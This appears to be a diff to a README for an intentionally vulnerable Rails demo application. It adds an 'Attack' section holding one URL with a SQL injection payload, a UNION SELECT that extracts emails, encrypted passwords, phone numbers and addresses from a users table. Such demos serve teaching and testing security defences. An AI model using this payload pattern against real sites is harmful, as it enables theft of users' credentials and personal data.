@@ -19,3 +19,6 @@ Once bundler is installed:
 
     $ rails s
 
+### Attack
+
+https://disrupt.sqreen.io/characters/1%20UNION%20SELECT%201,email,encrypted_password,4,5,6,7,8,9,10,phone,address,1%20FROM%20users%20LIMIT%201,1
